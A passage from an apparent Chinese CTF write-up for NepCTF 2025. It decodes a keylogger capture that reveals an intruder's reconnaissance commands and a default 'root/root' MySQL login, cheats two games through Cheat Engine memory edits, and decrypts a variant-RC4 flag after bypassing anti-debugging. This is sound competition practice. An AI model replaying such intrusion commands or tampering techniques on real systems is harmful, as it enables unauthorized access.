class="line">&#125;;</span><br></pre></td></tr></table></figure><p>解析代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">KEY_MAP = &#123;</span><br><span class="line">    <span class="number">0x01</span>: <span class="string">&quot;ESC&quot;</span>,</span><br><span class="line">    <span class="number">0x02</span>: <span class="string">&quot;1&quot;</span>, <span class="number">0x03</span>: <span class="string">&quot;2&quot;</span>, <span class="number">0x04</span>: <span class="string">&quot;3&quot;</span>, <span class="number">0x05</span>: <span class="string">&quot;4&quot;</span>, <span class="number">0x06</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="number">0x07</span>: <span class="string">&quot;6&quot;</span>, <span class="number">0x08</span>: <span class="string">&quot;7&quot;</span>, <span class="number">0x09</span>: <span class="string">&quot;8&quot;</span>, <span class="number">0x0a</span>: <span class="string">&quot;9&quot;</span>, <span class="number">0x0b</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="number">0x0c</span>: <span class="string">&quot;-&quot;</span>, <span class="number">0x0d</span>: <span class="string">&quot;=&quot;</span>, <span class="number">0x0e</span>: <span class="string">&quot;[BACKSPACE]&quot;</span>,</span><br><span class="line">    <span class="number">0x0f</span>: <span class="string">&quot;[TAB]&quot;</span>,</span><br><span class="line">    <span class="number">0x10</span>: <span class="string">&quot;q&quot;</span>, <span class="number">0x11</span>: <span class="string">&quot;w&quot;</span>, <span class="number">0x12</span>: <span class="string">&quot;e&quot;</span>, <span class="number">0x13</span>: <span class="string">&quot;r&quot;</span>, <span class="number">0x14</span>: <span class="string">&quot;t&quot;</span>,</span><br><span class="line">    <span class="number">0x15</span>: <span class="string">&quot;y&quot;</span>, <span class="number">0x16</span>: <span class="string">&quot;u&quot;</span>, <span class="number">0x17</span>: <span class="string">&quot;i&quot;</span>, <span class="number">0x18</span>: <span class="string">&quot;o&quot;</span>, <span class="number">0x19</span>: <span class="string">&quot;p&quot;</span>,</span><br><span class="line">    <span class="number">0x1a</span>: <span class="string">&quot;[&quot;</span>, <span class="number">0x1b</span>: <span class="string">&quot;]&quot;</span>, <span class="number">0x1c</span>: <span class="string">&quot;[ENTER]\n&quot;</span>,</span><br><span class="line">    <span class="number">0x1d</span>: <span class="string">&quot;[L_CTRL]&quot;</span>,</span><br><span class="line">    <span class="number">0x1e</span>: <span class="string">&quot;a&quot;</span>, <span class="number">0x1f</span>: <span class="string">&quot;s&quot;</span>, <span class="number">0x20</span>: <span class="string">&quot;d&quot;</span>, <span class="number">0x21</span>: <span class="string">&quot;f&quot;</span>, <span class="number">0x22</span>: <span class="string">&quot;g&quot;</span>,</span><br><span class="line">    <span class="number">0x23</span>: <span class="string">&quot;h&quot;</span>, <span class="number">0x24</span>: <span class="string">&quot;j&quot;</span>, <span class="number">0x25</span>: <span class="string">&quot;k&quot;</span>, <span class="number">0x26</span>: <span class="string">&quot;l&quot;</span>, <span class="number">0x27</span>: <span class="string">&quot;;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x29</span>: <span class="string">&quot;`&quot;</span>,</span><br><span class="line">    <span class="number">0x2a</span>: <span class="string">&quot;[L_SHIFT]&quot;</span>,</span><br><span class="line">    <span class="number">0x2b</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="number">0x2c</span>: <span class="string">&quot;z&quot;</span>, <span class="number">0x2d</span>: <span class="string">&quot;x&quot;</span>, <span class="number">0x2e</span>: <span class="string">&quot;c&quot;</span>, <span class="number">0x2f</span>: <span class="string">&quot;v&quot;</span>, <span class="number">0x30</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">    <span class="number">0x31</span>: <span class="string">&quot;n&quot;</span>, <span class="number">0x32</span>: <span class="string">&quot;m&quot;</span>, <span class="number">0x33</span>: <span class="string">&quot;,&quot;</span>, <span class="number">0x34</span>: <span class="string">&quot;.&quot;</span>, <span class="number">0x35</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="number">0x36</span>: <span class="string">&quot;[R_SHIFT]&quot;</span>,</span><br><span class="line">    <span class="number">0x37</span>: <span class="string">&quot;[NUM_*]&quot;</span>,</span><br><span class="line">    <span class="number">0x38</span>: <span class="string">&quot;[L_ALT]&quot;</span>,</span><br><span class="line">    <span class="number">0x39</span>: <span class="string">&quot; &quot;</span>,</span><br><span class="line">    <span class="number">0x3a</span>: <span class="string">&quot;[CAPSLOCK]&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SHIFT_KEY_MAP = &#123;</span><br><span class="line">    <span class="number">0x02</span>: <span class="string">&quot;!&quot;</span>, <span class="number">0x03</span>: <span class="string">&quot;@&quot;</span>, <span class="number">0x04</span>: <span class="string">&quot;#&quot;</span>, <span class="number">0x05</span>: <span class="string">&quot;$&quot;</span>, <span class="number">0x06</span>: <span class="string">&quot;%&quot;</span>,</span><br><span class="line">    <span class="number">0x07</span>: <span class="string">&quot;^&quot;</span>, <span class="number">0x08</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="number">0x09</span>: <span class="string">&quot;*&quot;</span>, <span class="number">0x0a</span>: <span class="string">&quot;(&quot;</span>, <span class="number">0x0b</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">    <span class="number">0x0c</span>: <span class="string">&quot;_&quot;</span>, <span class="number">0x0d</span>: <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    <span class="number">0x10</span>: <span class="string">&quot;Q&quot;</span>, <span class="number">0x11</span>: <span class="string">&quot;W&quot;</span>, <span class="number">0x12</span>: <span class="string">&quot;E&quot;</span>, <span class="number">0x13</span>: <span class="string">&quot;R&quot;</span>, <span class="number">0x14</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">    <span class="number">0x15</span>: <span class="string">&quot;Y&quot;</span>, <span class="number">0x16</span>: <span class="string">&quot;U&quot;</span>, <span class="number">0x17</span>: <span class="string">&quot;I&quot;</span>, <span class="number">0x18</span>: <span class="string">&quot;O&quot;</span>, <span class="number">0x19</span>: <span class="string">&quot;P&quot;</span>,</span><br><span class="line">    <span class="number">0x1a</span>: <span class="string">&quot;&#123;&quot;</span>, <span class="number">0x1b</span>: <span class="string">&quot;&#125;&quot;</span>,</span><br><span class="line">    <span class="number">0x1e</span>: <span class="string">&quot;A&quot;</span>, <span class="number">0x1f</span>: <span class="string">&quot;S&quot;</span>, <span class="number">0x20</span>: <span class="string">&quot;D&quot;</span>, <span class="number">0x21</span>: <span class="string">&quot;F&quot;</span>, <span class="number">0x22</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">    <span class="number">0x23</span>: <span class="string">&quot;H&quot;</span>, <span class="number">0x24</span>: <span class="string">&quot;J&quot;</span>, <span class="number">0x25</span>: <span class="string">&quot;K&quot;</span>, <span class="number">0x26</span>: <span class="string">&quot;L&quot;</span>, <span class="number">0x27</span>: <span class="string">&quot;:&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="number">0x29</span>: <span class="string">&quot;~&quot;</span>,</span><br><span class="line">    <span class="number">0x2b</span>: <span class="string">&quot;|&quot;</span>,</span><br><span class="line">    <span class="number">0x2c</span>: <span class="string">&quot;Z&quot;</span>, <span class="number">0x2d</span>: <span class="string">&quot;X&quot;</span>, <span class="number">0x2e</span>: <span class="string">&quot;C&quot;</span>, <span class="number">0x2f</span>: <span class="string">&quot;V&quot;</span>, <span class="number">0x30</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    <span class="number">0x31</span>: <span class="string">&quot;N&quot;</span>, <span class="number">0x32</span>: <span class="string">&quot;M&quot;</span>, <span class="number">0x33</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="number">0x34</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="number">0x35</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_keylog</span>(<span class="params">file_path</span>):</span><br><span class="line">    event_format = struct.Struct(<span class="string">&#x27;2qHHI&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    result = []</span><br><span class="line">    shift_pressed = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                chunk = f.read(event_format.size)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; event_format.size:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                _, _, <span class="built_in">type</span>, code, value = event_format.unpack(chunk)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> code <span class="keyword">in</span> (<span class="number">0x2a</span>, <span class="number">0x36</span>): </span><br><span class="line">                        <span class="keyword">if</span> value == <span class="number">1</span>:</span><br><span class="line">                            shift_pressed = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">elif</span> value == <span class="number">0</span>:</span><br><span class="line">                            shift_pressed = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> value == <span class="number">1</span>:</span><br><span class="line">                        char = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                        <span class="keyword">if</span> shift_pressed:</span><br><span class="line">                            char = SHIFT_KEY_MAP.get(code, KEY_MAP.get(code, <span class="string">f&quot;[UNK_KEY:0x<span class="subst">&#123;code:x&#125;</span>]&quot;</span>))</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            char = KEY_MAP.get(code, <span class="string">f&quot;[UNK_KEY:0x<span class="subst">&#123;code:x&#125;</span>]&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        result.append(char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse_keylog(<span class="string">r&quot;.\NepBot_keylogger&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#NepCTF&#123;NepCTF-20250725-114514&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># whoami[ENTER]</span></span><br><span class="line"><span class="comment"># ifconfig[ENTER]</span></span><br><span class="line"><span class="comment"># uanme -a[BACKSPACE][BACKSPACE]uname -a[ENTER]</span></span><br><span class="line"><span class="comment"># ps -aux[ENTER]</span></span><br><span class="line"><span class="comment"># cat /etc/issue[ENTER]</span></span><br><span class="line"><span class="comment"># pwd[ENTER]</span></span><br><span class="line"><span class="comment"># mysql -uroot -proot[ENTER]</span></span><br><span class="line"><span class="comment"># show databases;[ENTER]</span></span><br><span class="line"><span class="comment"># ue[BACKSPACE]se NE[BACKSPACE][BACKSPACE]NepCTF-20250725-114514;[ENTER]</span></span><br><span class="line"><span class="comment"># show tables;[ENTER]</span></span><br><span class="line"><span class="comment"># Enjoy yourself~[ENTER]</span></span><br><span class="line"><span class="comment"># See u again.[ENTER]</span></span><br><span class="line"><span class="comment"># Hacked By 1cePeak:)[ENTER]</span></span><br><span class="line"><span class="comment"># [L_CTRL]c</span></span><br></pre></td></tr></table></figure><h2 id="SpeedMino"><a href="#SpeedMino" class="headerlink" title="SpeedMino"></a>SpeedMino</h2><p>游玩游戏的可以发现背景是一直在变换，猜测是正在解密的flag，需要解密一定次数才行，直接CheatEngine齿轮加速100000000倍，让他加速解密，游戏结束前就会解密完。</p><p><img src="/2025/07/28/NepCTF2025/image.png" alt="alt text"></p><p><img src="/2025/07/28/NepCTF2025/image-1.png" alt="alt text"></p><h2 id="MoewBle喵泡"><a href="#MoewBle喵泡" class="headerlink" title="MoewBle喵泡"></a>MoewBle喵泡</h2><p>CE附加，启用mono注入功能。</p><p><img src="/2025/07/28/NepCTF2025/image-2.png" alt="alt text"></p><p>单击Lookup instances找到实例，将角色血量改高就不会死。</p><p><img src="/2025/07/28/NepCTF2025/image-3.png" alt="alt text"></p><p>走遍地图接触每个点就可以得到各个部分flag，这边要吃一下最顶上的这个，才能解锁其中几个隐藏的。</p><p><img src="/2025/07/28/NepCTF2025/image-4.png" alt="alt text"></p><p>提示缺失的第七段flag在GM面板获取。</p><p><img src="/2025/07/28/NepCTF2025/image-5.png" alt="alt text"></p><p>找到GmManager，同样查找实例，然后调用这个OnKonamiCodeActivaied就可以激活GM面板。</p><p><img src="/2025/07/28/NepCTF2025/image-6.png" alt="alt text"></p><p>点击右上角齿轮打开，getflag 7即可得到最后部分flag。</p><p><img src="/2025/07/28/NepCTF2025/image-7.png" alt="alt text"></p><p><strong>NepCTF{94721248-773d-0b25-0e2d-db9cac299389}</strong></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="RealMe"><a href="#RealMe" class="headerlink" title="RealMe"></a>RealMe</h2><p>发现main函数下面有个函数，也是变体RC4加密，不过没被调用到，猜测是有反调试。</p><p><img src="/2025/07/28/NepCTF2025/image-8.png" alt="alt text"></p><p>x32dbg动调，使用Scyllahide插件一键过反调试，断点该处代码，发现被调用，edx也就是sbox，直接提取出来，对main函数的密文解密即可得到flag。</p><p><img src="/2025/07/28/NepCTF2025/image-9.png" alt="alt text"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_401A60</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">unsigned</span> __int8 *a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result&#123;&#125;; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v4&#123;&#125;;              <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v5&#123;&#125;;  <span class="comment">// al</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v6&#123;&#125;;  <span class="comment">// [esp+D3h] [ebp-35h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i&#123;&#125;;      <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line">    <span class="type">int</span> v8&#123;&#125;;              <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v9&#123;&#125;;              <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        result = i;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= a3)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v8 = (v8 + v9 * a1[v9]) % <span class="number">256</span>;</span><br><span class="line">        v6 = a1[v9];</span><br><span class="line">        a1[v9] = a1[v8];</span><br><span class="line">        a1[v8] = v6;</span><br><span class="line">        v4 = (a1[v8] + a1[v9]) % <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">2</span>))</span><br><span class="line">            v5 = a2[i] + a1[v4];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v5 = a2[i] - a1[v4];</span><br><span class="line">        a2[i] = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">256</span>] = &#123;</span><br><span class="line">        <span class="number">0x35</span>, <span class="number">0xE9</span>, <span class="number">0x55</span>, <span class="number">0xD7</span>, <span class="number">0x6E</span>, <span class="number">0x5F</span>, <span class="number">0x47</span>, <span class="number">0x3D</span>, <span class="number">0xCC</span>, <span class="number">0x9D</span>, <span class="number">0xD2</span>, <span class="number">0x6B</span>, <span class="number">0xEB</span>, <span class="number">0x52</span>, <span class="number">0x97</span>, <span class="number">0x19</span>,</span><br><span class="line">        <span class="number">0xD5</span>, <span class="number">0xC5</span>, <span class="number">0x80</span>, <span class="number">0x0B</span>, <span class="number">0x64</span>, <span class="number">0x2B</span>, <span class="number">0xCD</span>, <span class="number">0xF6</span>, <span class="number">0x95</span>, <span class="number">0xB1</span>, <span class="number">0x31</span>, <span class="number">0x34</span>, <span class="number">0x31</span>, <span class="number">0x08</span>, <span class="number">0x43</span>, <span class="number">0xBE</span>,</span><br><span class="line">        <span class="number">0x8C</span>, <span class="number">0x86</span>, <span class="number">0x16</span>, <span class="number">0x70</span>, <span class="number">0xFE</span>, <span class="number">0x36</span>, <span class="number">0x11</span>, <span class="number">0xFD</span>, <span class="number">0xA7</span>, <span class="number">0xB9</span>, <span class="number">0x55</span>, <span class="number">0xA0</span>, <span class="number">0x4E</span>, <span class="number">0x40</span>, <span class="number">0xDA</span>, <span class="number">0x08</span>,</span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xA2</span>, <span class="number">0x4C</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x15</span>, <span class="number">0xCE</span>, <span class="number">0xC3</span>, <span class="number">0x8D</span>, <span class="number">0xB5</span>, <span class="number">0x00</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x07</span>, <span class="number">0x32</span>,</span><br><span class="line">        <span class="number">0x1D</span>, <span class="number">0x5E</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0xF5</span>, <span class="number">0x19</span>, <span class="number">0x98</span>, <span class="number">0x0F</span>, <span class="number">0x8D</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0x48</span>, <span class="number">0xAB</span>, <span class="number">0x92</span>, <span class="number">0x15</span>, <span class="number">0xD6</span>,</span><br><span class="line">        <span class="number">0xDA</span>, <span class="number">0x6F</span>, <span class="number">0x1B</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x8A</span>, <span class="number">0x5B</span>, <span class="number">0x0E</span>, <span class="number">0x66</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0x1E</span>, <span class="number">0x2A</span>, <span class="number">0x6D</span>,</span><br><span class="line">        <span class="number">0x3C</span>, <span class="number">0x8F</span>, <span class="number">0x26</span>, <span class="number">0xC7</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0xDC</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0xE0</span>, <span class="number">0x82</span>, <span class="number">0x57</span>, <span class="number">0xCE</span>, <span class="number">0x66</span>, <span class="number">0x13</span>, <span class="number">0x4B</span>,</span><br><span class="line">        <span class="number">0x49</span>, <span class="number">0x6A</span>, <span class="number">0x1F</span>, <span class="number">0x1A</span>, <span class="number">0x09</span>, <span class="number">0x32</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0xAD</span>, <span class="number">0x65</span>, <span class="number">0x58</span>, <span class="number">0xBC</span>, <span class="number">0xD4</span>, <span class="number">0x5E</span>, <span class="number">0xD0</span>, <span class="number">0x2C</span>,</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0xBF</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x4C</span>, <span class="number">0xFC</span>, <span class="number">0x0B</span>, <span class="number">0xB9</span>, <span class="number">0x49</span>, <span class="number">0xDB</span>, <span class="number">0x6F</span>,</span><br><span class="line">        <span class="number">0x37</span>, <span class="number">0x27</span>, <span class="number">0x30</span>, <span class="number">0x51</span>, <span class="number">0x69</span>, <span class="number">0x61</span>, <span class="number">0xD5</span>, <span class="number">0x75</span>, <span class="number">0xD3</span>, <span class="number">0x74</span>, <span class="number">0xEB</span>, <span class="number">0x4F</span>, <span class="number">0x23</span>, <span class="number">0x54</span>, <span class="number">0x0C</span>, <span class="number">0x1C</span>,</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0x7F</span>, <span class="number">0x62</span>, <span class="number">0x25</span>, <span class="number">0xF4</span>, <span class="number">0x84</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x76</span>, <span class="number">0x03</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x5F</span>, <span class="number">0xCA</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0xC4</span>, <span class="number">0x97</span>, <span class="number">0x04</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x42</span>, <span class="number">0x4E</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0xE7</span>, <span class="number">0x93</span>, <span class="number">0xE2</span>,</span><br><span class="line">        <span class="number">0x64</span>, <span class="number">0x3F</span>, <span class="number">0xB7</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0xE5</span>, <span class="number">0x59</span>, <span class="number">0x8C</span>, <span class="number">0x6D</span>, <span class="number">0xED</span>, <span class="number">0x34</span>, <span class="number">0x85</span>, <span class="number">0xDF</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x09</span>,</span><br><span class="line">        <span class="number">0x94</span>, <span class="number">0xB3</span>, <span class="number">0x05</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0xD8</span>, <span class="number">0xBF</span>, <span class="number">0x7E</span>, <span class="number">0xAC</span>, <span class="number">0xAE</span>, <span class="number">0x9E</span>, <span class="number">0xD6</span>, <span class="number">0xC1</span>, <span class="number">0x3B</span>, <span class="number">0x54</span>, <span class="number">0x72</span>,</span><br><span class="line">        <span class="number">0x22</span>, <span class="number">0x5C</span>, <span class="number">0xE7</span>, <span class="number">0xD0</span>, <span class="number">0x6B</span>, <span class="number">0x25</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFB</span>, <span class="number">0x3B</span>, <span class="number">0x2D</span>, <span class="number">0x7C</span>, <span class="number">0x65</span>, <span class="number">0x5A</span>, <span class="number">0xCD</span>, <span class="number">0xF0</span>,</span><br><span class="line">        <span class="number">0xBD</span>, <span class="number">0x67</span>, <span class="number">0x74</span>, <span class="number">0x17</span>, <span class="number">0x02</span>, <span class="number">0x42</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x5A</span>, <span class="number">0xA7</span>, <span class="number">0xD1</span>, <span class="number">0x73</span>, <span class="number">0x94</span>, <span class="number">0xAF</span>, <span class="number">0x89</span>, <span class="number">0x06</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> v7[<span class="number">35</span>]&#123;&#125;;</span><br><span class="line">    v7[<span class="number">0</span>] = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">    v7[<span class="number">1</span>] = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">    v7[<span class="number">2</span>] = <span class="number">0xA2</span>;</span><br><span class="line">    v7[<span class="number">3</span>] = <span class="number">0x94</span>;</span><br><span class="line">    v7[<span class="number">4</span>] = <span class="number">0x2E</span>;</span><br><span class="line">    v7[<span class="number">5</span>] = <span class="number">0x8E</span>;</span><br><span class="line">    v7[<span class="number">6</span>] = <span class="number">0x5C</span>;</span><br><span class="line">    v7[<span class="number">7</span>] = <span class="number">0x95</span>;</span><br><span class="line">    v7[<span class="number">8</span>] = <span class="number">0x79</span>;</span><br><span class="line">    v7[<span class="number">9</span>] = <span class="number">0x16</span>;</span><br><span class="line">    v7[<span class="number">10</span>] = <span class="number">0xE5</span>;</span><br><span class="line">    v7[<span class="number">11</span>] = <span 